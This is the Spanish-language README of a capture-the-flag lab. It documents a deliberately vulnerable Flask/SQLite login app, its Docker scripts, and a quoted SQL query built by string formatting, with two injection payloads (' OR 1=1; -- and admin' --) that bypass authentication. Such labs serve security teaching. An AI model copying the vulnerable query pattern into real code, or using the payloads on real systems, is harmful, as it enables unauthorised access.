inject_sql_py (Inyección SQL en aplicación Flask con SQLite)

Árbol de archivos
inject_sql_py/
├── app.py              # Aplicación Flask vulnerable
├── requirements.txt    # Dependencias con versiones fijas (Flask y Werkzeug)
├── Dockerfile          # Construcción de la imagen Docker
├── docker-compose.yml  # Define el servicio y mapeo de puertos
├── prepare.bash        # Genera la flag, .env, _instance y base de datos
├── start.bash          # Levanta el contenedor
├── stop.bash           # Detiene y elimina el contenedor
├── users.db            # Base de datos SQLite (creada en prepare.bash)
└── templates/
    └── login.html      # Plantilla HTML con formulario de login

Descripción general
Este reto consiste en explotar una vulnerabilidad de inyección SQL en una aplicación web construida en Python con Flask. La aplicación implementa un formulario de login que conecta con una base de datos SQLite. La consulta SQL se construye concatenando directamente los valores enviados por el usuario, lo que permite inyección de código SQL.

El objetivo es saltarse la autenticación y obtener la flag contenida en _flag.txt.

prepare.bash
- Genera el archivo .env con el puerto (por defecto 50080).
- Escribe el nombre de la instancia en _instance.
- Crea el archivo _flag.txt con una flag estática.
- Inicializa la base de datos SQLite users.db con la tabla users.
- Inserta el usuario inicial admin con contraseña securepassword.

start.bash
- Levanta el contenedor con docker compose en segundo plano usando el nombre de instancia de _instance.

stop.bash
- Detiene y elimina el contenedor de la instancia.

docker-compose.yml
- Define el servicio webser.
- Construye la imagen con el Dockerfile.
- Mapea el puerto definido en .env al puerto 80 del contenedor.
- Monta el directorio actual dentro de /app en el contenedor.

Dockerfile
- Imagen base: python:3.9-slim.
- WORKDIR /app.
- Copia requirements.txt e instala Flask==2.0.3 y Werkzeug==2.0.3.
- Copia el resto del proyecto.
- Expone el puerto 80.
- CMD: python app.py.

requirements.txt
- Flask==2.0.3
- Werkzeug==2.0.3
Se fijan estas versiones porque en versiones recientes de Werkzeug ya no está disponible url_quote, necesaria para compatibilidad.

app.py
- Servidor Flask.
- Muestra un formulario de login (plantilla templates/login.html).
- Ruta /login procesa la autenticación:
  - Si faltan campos, devuelve error.
  - Si usuario y contraseña coinciden con admin/securepassword, devuelve bienvenida.
  - Si la consulta devuelve algún resultado pero las credenciales no coinciden exactamente, muestra la flag de _flag.txt.
- La vulnerabilidad se encuentra en la construcción de la consulta SQL:
  query = "SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(username, password)

templates/login.html
- Formulario HTML básico para ingresar usuario y contraseña.
- Botón de envío que manda los datos a /login.

Explotación de la vulnerabilidad
Payload 1:
Usuario: ' OR 1=1; --
Contraseña: cualquier valor
Esto convierte la consulta en:
SELECT * FROM users WHERE username = '' OR 1=1; --' AND password = '...'
El operador -- comenta el resto de la consulta y siempre devuelve verdadero.

Payload 2:
Usuario: admin' --
Contraseña: cualquier valor
Esto convierte la consulta en:
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
La condición de contraseña se ignora y se accede como admin.

En ambos casos la aplicación no muestra la bienvenida, sino la flag de _flag.txt.

Workflow
1. Ejecutar ./prepare.bash para preparar el entorno.
2. Ejecutar ./start.bash para levantar el contenedor.
3. Acceder en el navegador a http://127.0.0.1:50080.
4. Introducir un payload en el campo Usuario y enviar el formulario.
5. La aplicación mostrará la flag al explotar la vulnerabilidad.
6. Ejecutar ./stop.bash para detener el contenedor.

Requisitos previos
- Docker y Docker Compose instalados en el sistema.
- sqlite3 instalado localmente para ejecutar prepare.bash.

Tecnologías utilizadas
- Python 3.9-slim
- Flask 2.0.3
- Werkzeug 2.0.3
- SQLite
- Docker y Docker Compose

Acceso al reto
http://127.0.0.1:50080

Objetivos de aprendizaje
- Comprender la vulnerabilidad de inyección SQL en aplicaciones web.
- Construir payloads sencillos para saltarse autenticación.
- Observar cómo el uso incorrecto de string formatting en consultas SQL genera vulnerabilidades.
- Extraer la flag como demostración de explotación exitosa.

